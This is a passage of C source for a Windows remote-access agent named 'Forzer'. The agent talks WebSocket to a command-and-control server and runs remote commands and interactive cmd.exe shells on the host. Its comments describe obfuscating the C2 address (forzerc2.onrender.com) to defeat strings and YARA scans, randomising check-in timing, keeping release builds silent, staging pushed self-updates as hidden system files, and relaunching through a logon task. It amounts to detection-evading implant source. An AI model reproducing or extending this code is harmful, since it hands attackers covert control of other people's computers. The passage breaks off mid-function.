#define WIN32_LEAN_AND_MEAN
#define SECURITY_WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wincrypt.h>
#include <schannel.h>
#include <wctype.h>
#include <security.h>
#include <consoleapi.h>
#include <io.h>

/* IsConsole is absent from w64devkit's trimmed <consoleapi.h> *and* from its
   libkernel32.a, so declaring it WINBASEAPI compiles and then fails to link on
   __imp_IsConsole. It is resolved from kernel32 at run time instead, and a host
   that somehow lacks it is treated as having no console. The real prototype
   also takes no argument and reports on the calling process — the handle-taking
   form this replaced was wrong, and happened to link nowhere. */
typedef BOOL (WINAPI *is_console_fn)(void);
static is_console_fn p_is_console = NULL;

static void resolve_is_console(void) {
    p_is_console = (is_console_fn)(void *)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "IsConsole");
}

static int has_console(void) {
    return p_is_console ? (p_is_console() != 0) : 0;
}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "ngcrypt.h"

/* ------------------------------------------------------------------ */
/* Diagnostics                                                        */
/*                                                                    */
/* Nothing is written to the console, to a log file, or to the event  */
/* log unless this is compiled on. Build a debug binary with          */
/* -DFORZER_DEBUG=1 to get the reporting back; the release build      */
/* stays silent.                                                      */
/*                                                                    */
/* Arguments to DBG() are discarded when it is off, so they must be   */
/* free of side effects.                                              */
/* ------------------------------------------------------------------ */
#ifdef FORZER_DEBUG
#define DBG(...) do { fprintf(stderr, __VA_ARGS__); fflush(stderr); } while (0)
#else
#define DBG(...) do { } while (0)
#endif

/* ------------------------------------------------------------------ */
/* Operator-facing diagnostics                                         */
/*                                                                    */
/* The runtime path used to report protocol and identity problems     */
/* with bare fprintf(stderr, ...). A headless install has no console  */
/* to write to, so that text went nowhere while still costing a        */
/* formatted write per event; worse, a box that fails to authenticate  */
/* every reconnect produced a stream of it. INFO() prints only when a  */
/* person is watching, and always in a debug build.                    */
/*                                                                    */
/* Arguments to INFO() are discarded when it is off, so keep them      */
/* free of side effects.                                               */
/* ------------------------------------------------------------------ */
static int g_interactive = 0;
#ifdef FORZER_DEBUG
#define INFO(...) do { fprintf(stderr, __VA_ARGS__); fflush(stderr); } while (0)
#else
#define INFO(...) do { if (g_interactive) { fprintf(stderr, __VA_ARGS__); fflush(stderr); } } while (0)
#endif

/* MSVC-only linker directives. GCC ignores #pragma comment entirely, so on the
   MinGW build the equivalent -l flags in build.ps1 are what actually link these
   libraries; keeping them unguarded here only produced five warnings and the
   false impression that the libs are wired up by the source. */
#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "secur32.lib")
#endif

/* The control-plane endpoint is compiled in, but OBFUSCATED, not plaintext.

   It used to be `#define DEFAULT_SERVER "wss://forzerc2.onrender.com"` in the
   clear: one `strings` away, a hardcoded indicator for every static scanner
   and YARA rule, and it shipped the operator's infrastructure to anyone with
   a copy of the binary. That was the wrong trade — it bought "works with zero
   configuration" at the cost of a one-grep giveaway.

   Now the same default lives as a keystream-obfuscated byte array (see
   k_builtin_url_blob below) and is decoded at runtime, so a default install
   still knows where to connect but `strings Forzer.exe | grep wss` finds
   nothing. config.json still overrides it and FORZER_SERVER still overrides
   that, so a test build can be aimed elsewhere without a rebuild. */

/* ------------------------------------------------------------------ */
/* Self-update                                                        */
/* ------------------------------------------------------------------ */

static const char *json_str(const char *s, const char *key, char *out, int outsz);
static void update_announce(const char *json);
static void update_blob(unsigned char *data, int len);

/* SHA-256 of a file, lowercase hex. Used to pin the self-update payload. */
static int sha256_hex_file(const char *path, char out[65]) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    HCRYPTPROV prov = 0; HCRYPTHASH hh = 0;
    if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) ||
        !CryptCreateHash(prov, CALG_SHA_256, 0, 0, &hh)) {
        if (prov) CryptReleaseContext(prov, 0);
        CloseHandle(h);
        return 0;
    }
    BYTE buf[8192]; DWORD n = 0; BYTE dig[32];
    int ok = 1;
    for (;;) {
        if (!ReadFile(h, buf, sizeof(buf), &n, NULL)) { ok = 0; break; }
        if (n == 0) break;
        if (!CryptHashData(hh, buf, n, 0)) { ok = 0; break; }
    }
    DWORD dlen = sizeof(dig);
    if (ok && !CryptGetHashParam(hh, HP_HASHVAL, dig, &dlen, 0)) ok = 0;
    CryptDestroyHash(hh);
    CryptReleaseContext(prov, 0);
    CloseHandle(h);
    if (!ok) return 0;
    static const char hx[] = "0123456789abcdef";
    for (int i = 0; i < 32; i++) {
        out[i * 2]     = hx[(dig[i] >> 4) & 15];
        out[i * 2 + 1] = hx[dig[i] & 15];
    }
    out[64] = 0;
    return 1;
}

/* Install a staged update binary over the running agent.

   The payload arrives over the control plane rather than from a URL, so this
   only verifies and swaps: the caller owns tmp_path and is responsible for
   deleting it on failure. want_sha must be 64 lowercase hex characters.

   The swap renames the running image aside before moving the new one in,
   which is the only way to replace a file that is currently mapped. */
/* Set once this process has already moved its own running image aside. After
   that the running image is the .bak, not self_path, so a second queued
   update in the same process must NOT redo the rename (the .bak is mapped and
   locked, which is the ERROR_ACCESS_DENIED seen when two agents shared a
   path). In that state self_path is an ordinary stale file and is replaced
   directly. */
static int g_installed_this_process = 0;

static int install_from_path(const char *tmp_path, const char *want_sha) {
    char self_path[MAX_PATH];
    char bak_path[MAX_PATH];

    if (!GetModuleFileNameA(NULL, self_path, MAX_PATH)) {
        fprintf(stderr, "error: GetModuleFileName failed (%lu)\n", GetLastError());
        return 1;
    }
    if (!want_sha || strlen(want_sha) != 64) {
        fprintf(stderr, "error: refusing to install: no pinned sha256\n");
        return 1;
    }

    char got_sha[65];
    if (!sha256_hex_file(tmp_path, got_sha)) {
        fprintf(stderr, "error: could not hash the staged binary\n");
        return 1;
    }
    if (_stricmp(got_sha, want_sha) != 0) {
        fprintf(stderr, "error: hash mismatch - refusing to install\n");
        fprintf(stderr, "  expected %s\n", want_sha);
        fprintf(stderr, "  got      %s\n", got_sha);
        return 1;
    }
    printf("hash verified: %s\n", got_sha);

    /* Truncation check as config_path()/identity_path() do it: snprintf
       returns the length it wanted, so a .bak that cannot fit is refused here
       rather than silently naming a shortened path and moving the running exe
       onto it. */
    if (snprintf(bak_path, MAX_PATH, "%s.bak", self_path) >= MAX_PATH) {
        fprintf(stderr, "error: install path too long to keep a .bak\n");
        return 1;
    }

    if (g_installed_this_process) {
        /* Running image is already the .bak; self_path is free to overwrite. */
        if (!MoveFileExA(tmp_path, self_path, MOVEFILE_REPLACE_EXISTING)) {
            fprintf(stderr, "error: could not install update (%lu)\n", GetLastError());
            return 1;
        }
        printf("update installed: %s\n", self_path);
        return 0;
    }

    DeleteFileA(bak_path);
    if (!MoveFileExA(self_path, bak_path, MOVEFILE_REPLACE_EXISTING)) {
        fprintf(stderr, "error: could not rename current exe (%lu)\n", GetLastError());
        return 1;
    }

    if (!MoveFileExA(tmp_path, self_path, MOVEFILE_REPLACE_EXISTING)) {
        fprintf(stderr, "error: could not install update (%lu)\n", GetLastError());
        MoveFileExA(bak_path, self_path, MOVEFILE_REPLACE_EXISTING);
        return 1;
    }

    g_installed_this_process = 1;
    printf("update installed: %s\n", self_path);
    printf("previous version kept as: %s\n", bak_path);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Update over the control plane                                       */
/* ------------------------------------------------------------------ */

/* An update arrives in two parts: a control message announcing the digest
   and length, then the binary itself in one or more WebSocket binary frames.
   Nothing is written to disk until both halves are here, so a dropped
   connection mid-transfer cannot leave a half-written file that a later run
   might pick up. */
static char g_upd_sha[65];
static long long g_upd_size = 0;
static int g_upd_restart = 0;   /* server-chosen: 1 relaunch now, 0 apply on next start */

static void update_clear(void) { g_upd_sha[0] = 0; g_upd_size = 0; g_upd_restart = 0; }

/* A JSON number, which json_str() cannot read: it returns NULL for any value
   that is not a quoted string, and the control plane sends `size` as a bare
   number. Reading it with json_str() left the length check permanently
   disabled — the digest was still verified, so this was not an integrity
   hole, but the size comparison below never once ran. */
static long long json_i64(const char *s, const char *key, int *found) {
    char pat[64];
    if (found) *found = 0;
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(s, pat);
    if (!p) return 0;
    p += strlen(pat);
    while (*p && *p != ':') p++;
    if (!*p) return 0;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    int neg = 0;
    if (*p == '-') { neg = 1; p++; }
    if (*p < '0' || *p > '9') return 0;   /* not a number: leave it unset */
    long long v = 0;
    while (*p >= '0' && *p <= '9') {
        if (v > (9223372036854775807LL - 9) / 10) return 0;  /* absurd: treat as unset */
        v = v * 10 + (*p - '0');
        p++;
    }
    if (found) *found = 1;
    return neg ? -v : v;
}

/* The control half. Records what the server said the payload should hash to;
   the binary half refuses anything that does not match. */
static void update_announce(const char *json) {
    char sha[128] = {0};
    int have_size = 0;
    long long size = json_i64(json, "size", &have_size);
    json_str(json, "sha256", sha, sizeof(sha));
    if (strlen(sha) != 64) {
        INFO("update refused: server did not pin a 64-character sha256\n");
        update_clear();
        return;
    }
    memcpy(g_upd_sha, sha, 65);
    /* A missing or unparsable size leaves the check off rather than guessing:
       the digest is the control that matters, and a wrong size would refuse an
       otherwise-correct payload. */
    g_upd_size = have_size ? size : -1;
    /* restart is a mode selector chosen by the control plane: 1 installs and
       relaunches this process immediately, 0 installs and leaves the running
       process alone so the new image takes effect at the next agent start
       (the logon task, or any later relaunch). Default 0 keeps the quieter
       "no self-spawn" behaviour when the field is absent. */
    int have_restart = 0;
    long long r = json_i64(json, "restart", &have_restart);
    g_upd_restart = (have_restart && r != 0) ? 1 : 0;
    INFO("update announced: %lld bytes, sha256 %s (%s)\n", g_upd_size, g_upd_sha,
         g_upd_restart ? "restart now" : "apply on next start");
}

/* The binary half. Stages the payload, then hands it to the installer, which
   re-hashes it before anything is swapped. */
static void update_blob(unsigned char *data, int len) {
    char temp_dir[MAX_PATH], tmp_path[MAX_PATH];

    if (!g_upd_sha[0]) {
        INFO("update refused: binary arrived with no announcement\n");
        return;
    }
    if (g_upd_size >= 0 && g_upd_size != (long long)len) {
        INFO("update refused: expected %lld bytes, got %d\n", g_upd_size, len);
        update_clear();
        return;
    }
    if (!GetTempPathA(MAX_PATH, temp_dir) ||
        !GetTempFileNameA(temp_dir, "frz", 0, tmp_path)) {
        INFO("update failed: could not stage a temp file (%lu)\n", GetLastError());
        update_clear();
        return;
    }
    HANDLE h = CreateFileA(tmp_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        INFO("update failed: could not open staged file (%lu)\n", GetLastError());
        DeleteFileA(tmp_path);
        update_clear();
        return;
    }
    DWORD wrote = 0;
    BOOL ok = WriteFile(h, data, (DWORD)len, &wrote, NULL) && wrote == (DWORD)len;
    CloseHandle(h);
    if (!ok) {
        INFO("update failed: short write to staged file\n");
        DeleteFileA(tmp_path);
        update_clear();
        return;
    }

    char want[65];
    memcpy(want, g_upd_sha, 65);
    int want_restart = g_upd_restart;
    update_clear();
    if (install_from_path(tmp_path, want) != 0) {
        DeleteFileA(tmp_path);
        return;
    }

    /* Mode 0: the new image is on disk but this process is still the old code.
       Do not relaunch and do not exit. The scheduled logon task runs the new
       binary at the next start; until then nothing spawns, so the update costs
       no self-relaunch process event. */
    if (!want_restart) {
        INFO("update installed; takes effect at next agent start\n");
        return;
    }

    /* Mode 1: the image that was running has just been renamed aside, so this
       process is still the old code. Relaunch the installed binary and let
       this one go; a clean exit leaves no half-dead agent behind. */
    char self_path[MAX_PATH];
    if (GetModuleFileNameA(NULL, self_path, MAX_PATH)) {
        STARTUPINFOA si; PROCESS_INFORMATION pi;
        memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
        memset(&pi, 0, sizeof(pi));
        CreateProcessA(self_path, NULL, NULL, NULL, FALSE,
                       CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS,
                       NULL, NULL, &si, &pi);
        if (pi.hThread) CloseHandle(pi.hThread);
        if (pi.hProcess) CloseHandle(pi.hProcess);
    }
    INFO("update installed and relaunched\n");
    ExitProcess(0);
}

/* ------------------------------------------------------------------ */
/* Control-plane client (WebSocket over raw Winsock)                  */
/* ------------------------------------------------------------------ */

#define WS_GUID "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

/* Remote-command state. Execution defaults ON but can be disabled with
   FORZER_ALLOW_REMOTE=0 (no flag needed). */
static int g_allow_remote = 1;

/* ------------------------------------------------------------------ */
/* The op table                                                        */
/* ------------------------------------------------------------------ */

/* Protocol revision, advertised at registration and cross-checked against
   shared/ops.json. It tracks the op table, not the framing, which is why it
   is defined immediately above that table. */
#define FORZER_PROTO 3

/* What this build can be asked to do, and what each thing costs the operator.
   This is the agent's half of shared/ops.json. The catalog on the server is
   the contract; this table is the implementation, and the join key is the wire
   verb. server/test/ops.test.js runs this binary and fails if the two drift,
   because a verb the server offers but this build lacks is exactly the kind of
   mismatch that used to surface as "nothing happened".

   The table exists so that authorization is a property of the operation rather
   than something each handler remembers to check. The old chain repeated
   `if (!from_viewer) continue;` in five branches and `if (!g_allow_remote)`
   in three; every one was an opportunity to forget. Now the lookup happens
   once, up front, and a verb that is not in this table is refused explicitly
   instead of falling through to a catch-all that ignored it. */
typedef struct {
    const char *verb;    /* wire type on the frame */
    const char *name;    /* catalog name, what a client asks for */
    const char *cap;     /* capability required to originate it */
} op_def;

static const op_def OPS[] = {
    { "command",    "exec",        "exec"    },
    { "term-start", "shell.open",  "shell"   },
    { "term-input", "shell.input", "shell"   },
    { "term-end",   "shell.close", "shell"   },
    { "cancel",     "cancel",      "control" },
    { "sleep",      "sleep",       "control" },
    { "update",     "update",      "update"  },
};
static const int OPS_N = (int)(sizeof(OPS) / sizeof(OPS[0]));

static const op_def *op_lookup(const char *verb) {
    int i;
    for (i = 0; i < OPS_N; i++)
        if (strcmp(OPS[i].verb, verb) == 0) return &OPS[i];
    return NULL;
}

/* "exec","shell.open","shell.input","shell.close","cancel","sleep","update"
   - the list of catalog names, sent once at registration. The control plane
   uses it to refuse an op this build cannot service instead of queueing work
   that would never be answered.

   Deliberately no brackets: the caller owns the surrounding JSON, and an
   earlier version closed the array here as well. That produced `[...]}]`,
   which the server's parse guard rejects by closing the socket with no log
   line at all. The bug survived a visual diff of `--ops` against the catalog
   because both sides were compared as text; the drift test parses, and the
   live agent run is what actually surfaced it. */
static void ops_json(char *out, size_t cap) {
    size_t n = 0;
    int i;
    if (cap == 0) return;
    out[0] = '\0';
    for (i = 0; i < OPS_N; i++) {
        size_t wrote = (size_t)snprintf(out + n, cap - n, "%s\"%s\"", i ? "," : "", OPS[i].name);
        if (wrote >= cap - n) { out[cap - 1] = '\0'; return; }  /* truncated, not overflowed */
        n += wrote;
    }
}

/* Write the op table to a file instead of stdout.

   The release build is -mwindows: the process has no console, stdout is not
   bound even when a parent redirects it, and `--ops` therefore prints nothing
   while still exiting 0. server/test/ops.test.js used to run the binary, see
   empty stdout, and skip itself — on every run, silently, forever. That test
   is the only thing keeping this table and shared/ops.json in agreement, so a
   guard that never runs is worse than no guard: it looks like coverage.

   A file has the same answer in both subsystem modes, which is what makes the
   test able to fail instead of skip.

   A relative path is resolved against the process's working directory, which
   is how server/test/ops.test.js reaches it: the test may be running under a
   Linux Node on WSL, where a path it composes is meaningless to a Windows
   binary, so it passes a bare filename and sets the child's cwd instead. */
static int ops_write_file(const char *path) {
    char list[256], json[512];
    size_t len;
    DWORD wrote = 0;
    HANDLE h;

    ops_json(list, sizeof(list));
    snprintf(json, sizeof(json), "{\"proto\":%d,\"ops\":[%s]}\n", FORZER_PROTO, list);
    len = strlen(json);

    h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    if (!WriteFile(h, json, (DWORD)len, &wrote, NULL) || wrote != (DWORD)len) {
        CloseHandle(h);
        return -1;
    }
    CloseHandle(h);
    return 0;
}
static SOCKET g_sock = INVALID_SOCKET;

/* Set by the control plane's `sleep` message. Non-zero means "this agent was
   told to go quiet; wait this long before the next check-in". */
static DWORD g_sleep_ms = 0;

/* wss (TLS) transport via SCHANNEL */
static int g_use_tls = 0;
static CredHandle g_cred;
static CtxtHandle g_ctx;
static SOCKET g_tls_sock = INVALID_SOCKET;
static SecPkgContext_StreamSizes g_ssizes;
static BYTE *g_tls_in = NULL; static int g_tls_in_len = 0, g_tls_in_cap = 0;
static BYTE *g_tls_out = NULL; static int g_tls_out_len = 0, g_tls_out_off = 0;

static int tr_send(const char *data, int len);
static int tr_recv(char *out, int cap, int *is_bin);

/* ------------------------------------------------------------------ */
/* ConPTY-based interactive terminal                                  */
/*                                                                   */
/* Uses Windows 10 1809+ Pseudo Console (ConPTY) for a real shell.   */
/* A background reader thread captures output; input is written via   */
/* WriteFile on the ConPTY stdin pipe.                                */
/* ------------------------------------------------------------------ */

#ifndef PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE
#define ProcThreadAttributePseudoConsole 22
#define PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE \
    ProcThreadAttributeValue(ProcThreadAttributePseudoConsole, FALSE, TRUE, FALSE)
#endif

typedef HRESULT (WINAPI *fnCreatePseudoConsole_t)(COORD, HANDLE, HANDLE, DWORD, void**);
typedef VOID    (WINAPI *fnClosePseudoConsole_t)(void*);
typedef BOOL    (WINAPI *fnInitializeProcThreadAttributeList_t)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL    (WINAPI *fnUpdateProcThreadAttribute_t)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef VOID    (WINAPI *fnDeleteProcThreadAttributeList_t)(LPPROC_THREAD_ATTRIBUTE_LIST);

static fnCreatePseudoConsole_t    pCreatePseudoConsole    = NULL;
static fnClosePseudoConsole_t     pClosePseudoConsole     = NULL;
static fnInitializeProcThreadAttributeList_t pInitializeProcThreadAttributeList = NULL;
static fnUpdateProcThreadAttribute_t pUpdateProcThreadAttribute = NULL;
static fnDeleteProcThreadAttributeList_t pDeleteProcThreadAttributeList = NULL;
static int g_conpty_available = -1; /* -1=not checked, 0=no, 1=yes */

static int conpty_init(void) {
    if (g_conpty_available >= 0) return g_conpty_available;
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) { g_conpty_available = 0; return 0; }
    pCreatePseudoConsole    = (fnCreatePseudoConsole_t)    (void *)GetProcAddress(hK32, "CreatePseudoConsole");
    pClosePseudoConsole     = (fnClosePseudoConsole_t)     (void *)GetProcAddress(hK32, "ClosePseudoConsole");
    pInitializeProcThreadAttributeList = (fnInitializeProcThreadAttributeList_t) (void *)GetProcAddress(hK32, "InitializeProcThreadAttributeList");
    pUpdateProcThreadAttribute = (fnUpdateProcThreadAttribute_t) (void *)GetProcAddress(hK32, "UpdateProcThreadAttribute");
    pDeleteProcThreadAttributeList = (fnDeleteProcThreadAttributeList_t) (void *)GetProcAddress(hK32, "DeleteProcThreadAttributeList");
    g_conpty_available = (pCreatePseudoConsole && pClosePseudoConsole &&
                          pInitializeProcThreadAttributeList && pUpdateProcThreadAttribute) ? 1 : 0;
    if (!g_conpty_available)
        DBG("[conpty] CreatePseudoConsole not available (needs Win10 1809+)\n");
    return g_conpty_available;
}

/* How many times one terminal session may respawn its shell before the session
   is ended instead. The reader thread exiting used to trigger an unconditional
   restart, so an operator who typed `exit` — or a shell that died on its own —
   produced a new cmd.exe every few hundred milliseconds for as long as the
   viewer stayed connected. A cap turns a spawn loop into a closed session. */
#define TERM_MAX_RESPAWNS 3

typedef struct {
    int active;
    /* TRUE once the critical section has been initialised. Every code path that
       tears the session down sets it back to 0, so a start-up failure can never
       leave the main loop entering a deleted critical section. */
    int inited;
    char id[64];
    char to[64];
    CRITICAL_SECTION lock;
    char outbuf[1<<20];    /* buffered ConPTY output (reader thread writes, main thread drains) */
    int outlen;
    void *hPC;             /* HPCON (pseudo console handle) */
    HANDLE hPipeIn;        /* our end: read ConPTY output */
    HANDLE hPipeOut;       /* our end: write ConPTY input */
    HANDLE hProcess;       /* child cmd.exe process handle */
    HANDLE hReaderThread;  /* background reader thread */
    int reader_exited;     /* set by reader thread when pipe breaks */
    int restarts;          /* shells respawned in this session, <= TERM_MAX_RESPAWNS */
} term_session_t;

static term_session_t g_term;
static int tls_send(const char *data, int len);
static int tls_recv(char *out, int cap);

static void base64(const BYTE *in, int n, char *out) {
    static const char t[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i, o = 0;
    for (i = 0; i + 2 < n; i += 3) {
        unsigned v = (in[i] << 16) | (in[i + 1] << 8) | in[i + 2];
        out[o++] = t[(v >> 18) & 63]; out[o++] = t[(v >> 12) & 63];
        out[o++] = t[(v >> 6) & 63]; out[o++] = t[v & 63];
    }
    int rem = n - i;
    if (rem == 1) {
        unsigned v = in[i] << 16;
        out[o++] = t[(v >> 18) & 63]; out[o++] = t[(v >> 12) & 63];
        out[o++] = '='; out[o++] = '=';
    } else if (rem == 2) {
        unsigned v = (in[i] << 16) | (in[i + 1] << 8);
        out[o++] = t[(v >> 18) & 63]; out[o++] = t[(v >> 12) & 63];
        out[o++] = t[(v >> 6) & 63]; out[o++] = '=';
    }
    out[o] = 0;
}

static int sha1(const BYTE *data, DWORD len, BYTE out[20]) {
    HCRYPTPROV h;
    if (!CryptAcquireContext(&h, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return 0;
    HCRYPTHASH hh;
    if (!CryptCreateHash(h, CALG_SHA1, 0, 0, &hh)) { CryptReleaseContext(h, 0); return 0; }
    CryptHashData(hh, data, len, 0);
    DWORD s = 20;
    CryptGetHashParam(hh, HP_HASHVAL, out, &s, 0);
    CryptDestroyHash(hh);
    CryptReleaseContext(h, 0);
    return 1;
}

static int rng_bytes(BYTE *buf, int n) {
    HCRYPTPROV h;
    if (!CryptAcquireContext(&h, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return 0;
    int ok = CryptGenRandom(h, n, buf);
    CryptReleaseContext(h, 0);
    return ok;
}

/* Uniform integer in [lo, hi], inclusive, from the CNG CSPRNG. Every timing
   decision this agent makes goes through here, so no interval it picks is ever
   a fixed one. A missing entropy source returns the midpoint rather than a
   constant: predictable is worse than merely varied, but both beat a
   metronome. */
static int jitter_ms(int lo, int hi) {
    if (hi <= lo) return lo;
    BYTE b[4];
    if (!rng_bytes(b, sizeof(b))) return lo + (hi - lo) / 2;
    unsigned long v = ((unsigned long)b[0] << 24) | ((unsigned long)b[1] << 16) |
                      ((unsigned long)b[2] << 8) | (unsigned long)b[3];
    return lo + (int)(v % (unsigned long)(hi - lo + 1));
}

/* Integer from the environment, clamped into [lo, hi]. */
static int env_int(const char *name, int dflt, int lo, int hi) {
    const char *v = getenv(name);
    if (!v || !*v) return dflt;
    long n = strtol(v, NULL, 10);
    if (n < lo) return lo;
    if (n > hi) return hi;
    return (int)n;
}

static int sock_recv_n(SOCKET s, char *buf, int len) {
    int got = 0;
    while (got < len) {
        int r = recv(s, buf + got, len - got, 0);
        if (r <= 0) return 0;
        got += r;
    }
    return 1;
}

static int sock_send_all(SOCKET s, const char *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int r = send(s, buf + sent, len - sent, 0);
        if (r <= 0) return 0;
        sent += r;
    }
    return 1;
}

static int ws_send_frame(SOCKET s, unsigned char opcode, const char *data, int len) {
    unsigned char hdr[10];
    int hl = 2;
    hdr[0] = 0x80 | opcode;
    unsigned char mask[4];
    if (!rng_bytes(mask, 4)) return 0; /* never mask a frame with stack garbage */
    if (len < 126) {
        hdr[1] = 0x80 | (unsigned char)len;
    } else if (len < 65536) {
        hdr[1] = 0x80 | 126;
        hdr[2] = (unsigned char)(len >> 8);
        hdr[3] = (unsigned char)len;
        hl = 4;
    } else {
        hdr[1] = 0x80 | 127;
        for (int i = 0; i < 8; i++) hdr[2 + i] = (unsigned char)((long long)len >> (8 * (7 - i)));
        hl = 10;
    }
    int framelen = hl + 4 + (len > 0 ? len : 0);
    BYTE *frame = (BYTE *)malloc(framelen > 0 ? framelen : 1);
    if (!frame) return 0;
    memcpy(frame, hdr, hl);
    memcpy(frame + hl, mask, 4);
    if (len > 0) {
        for (int i = 0; i < len; i++) frame[hl + 4 + i] = (BYTE)(data[i] ^ mask[i & 3]);
    }
    int ok;
    if (g_use_tls) ok = tls_send((char *)frame, framelen);
    else ok = sock_send_all(s, (char *)frame, framelen);
    free(frame);
    return ok;
}

static int ws_net_recv_n(char *buf, int len) {
    if (g_use_tls) {
        int got = 0;
        while (got < len) {
            int r = tls_recv(buf + got, len - got);
            if (r <= 0) return 0;
            got += r;
        }
        return 1;
    }
    return sock_recv_n(g_sock, buf, len);
}

/* Reassembly buffer for one binary message.

   The control path below only understands text (0x1) and drops anything
   else, so an update pushed as a binary frame would be discarded without a
   trace. Binary messages are streamed here in fixed chunks instead of being
   copied into a caller-sized buffer, because the payload is an order of
   magnitude larger than any control message and must never be truncated to
   fit one. */
#define WS_BIN_MAX (8u << 20)   /* ceiling on a single pushed message */
static unsigned char *g_bin = NULL;
static long long g_binlen = 0;

static int ws_bin_append(const unsigned char *d, int len) {
    if (g_binlen + len > (long long)WS_BIN_MAX) return 0;
    unsigned char *nb = realloc(g_bin, (size_t)(g_binlen + len) + 1);
    if (!nb) return 0;
    g_bin = nb;
    memcpy(g_bin + g_binlen, d, (size_t)len);
    g_binlen += len;
    g_bin[g_binlen] = 0;
    return 1;
}

/* Hand the reassembled message to the caller, which owns it from here. */
static void ws_bin_take(unsigned char **p, int *len) {
    *p = g_bin;
    *len = (int)g_binlen;
    g_bin = NULL;
    g_binlen = 0;
}

static void ws_bin_clear(void) { free(g_bin); g_bin = NULL; g_binlen = 0; }

/* Frame reader. Control frames (ping/pong/oversize) recurse on themselves in
   the original; a peer that sent a long run of pings walked the stack off the
   end. This is a loop instead. */
static int ws_recv(SOCKET s, char *out, int cap) {
    int in_binary = 0;
    for (;;) {
        unsigned char h[2];
        if (!ws_net_recv_n((char *)h, 2)) return -1;
        int fin    = (h[0] & 0x80) != 0;
        int opcode = h[0] & 0x0f;
        int masked = h[1] & 0x80;
        long long len = h[1] & 0x7f;
        if (len == 126) {
            unsigned char e[2];
            if (!ws_net_recv_n((char *)e, 2)) return -1;
            len = (e[0] << 8) | e[1];
        } else if (len == 127) {
            unsigned char e[8];
            if (!ws_net_recv_n((char *)e, 8)) return -1;
            len = 0;
            for (int i = 0; i < 8; i++) len = (len << 8) | e[i];
        }
        if (len < 0 || len > 0x7fffffffLL) return -1;
        unsigned char mkey[4];
        if (masked && !ws_net_recv_n((char *)mkey, 4)) return -1;

        /* Binary (0x2) and its continuations (0x0) reassemble into g_bin.
           This has to happen before the cap check below, which drains and
           discards anything too large for `out` - exactly the fate a pushed
           update would otherwise meet. */
        if (opcode == 0x2) { ws_bin_clear(); in_binary = 1; }
        if (opcode == 0x2 || (opcode == 0x0 && in_binary)) {
            long long left = len;
            unsigned char chunk[16384];
            while (left > 0) {
                int c = (int)(left > (long long)sizeof(chunk) ? (long long)sizeof(chunk) : left);
                if (!ws_net_recv_n((char *)chunk, c)) return -1;
                if (masked) for (int i = 0; i < c; i++) chunk[i] ^= mkey[i & 3];
                if (!ws_bin_append(chunk, c)) { DBG("binary message over %u bytes\n", (unsigned)WS_BIN_MAX); return -1; }
                left -= c;
            }
            if (!fin) continue;              /* more fragments to come */
            in_binary = 0;
            return (int)g_binlen;
        }

        if (len >= cap) {
            /* Frame was larger than our buffer; drain it and keep reading the
               next frame instead of killing the connection. */
            long long left = len; char tmp[512];
            while (left > 0) {
                int c = (int)(left > (long long)sizeof(tmp) ? (long long)sizeof(tmp) : left);
                if (!ws_net_recv_n(tmp, c)) return -1;
                left -= c;
            }
            continue;
        }
        if (!ws_net_recv_n(out, (int)len)) return -1;
        if (masked) for (long long i = 0; i < len; i++) out[i] ^= mkey[i & 3];
        out[len] = 0;

        if (opcode == 0x8) return -1;
        if (opcode == 0x9) { ws_send_frame(s, 0xA, out, (int)len); continue; }
        if (opcode == 0xA) continue;
        if (opcode != 0x1) continue;
        return (int)len;
    }
}

/* True once the HTTP upgrade succeeded, i.e. once the socket is carrying
   WebSocket frames and a close frame means something. */
static int g_ws_up = 0;

/* Orderly close. A deliberate disconnect (going quiet, backing off) should
   leave a clean close handshake with a status code on the wire rather than a
   socket that simply stops, which is what a half-finished connection looks
   like to anything reading connection logs. */
static void ws_close_clean(SOCKET s, unsigned code) {
    char buf[8];
    snprintf(buf, sizeof(buf), "%04X", code & 0xFFFF);
    ws_send_frame(s, 0x8, buf, 4);
}

/* Release everything one connection attempt allocated.

   Every failure path and the normal exit both go through here. They used to
   call WSACleanup() on their own, which drops the Winsock catalog but not the
   socket or the Schannel context — and a failed attempt ends in a reconnect,
   not in process exit, so those handles accumulated for the life of the
   install. The terminal session is deliberately left alone: it is designed to
   survive a reconnect. */
static void session_teardown(void) {
    if (g_ws_up) {
        ws_close_clean(g_sock, 1000);
        g_ws_up = 0;
    }
    if (g_use_tls) {
        DeleteSecurityContext(&g_ctx);
        FreeCredentialsHandle(&g_cred);
        if (g_tls_sock != INVALID_SOCKET) closesocket(g_tls_sock);
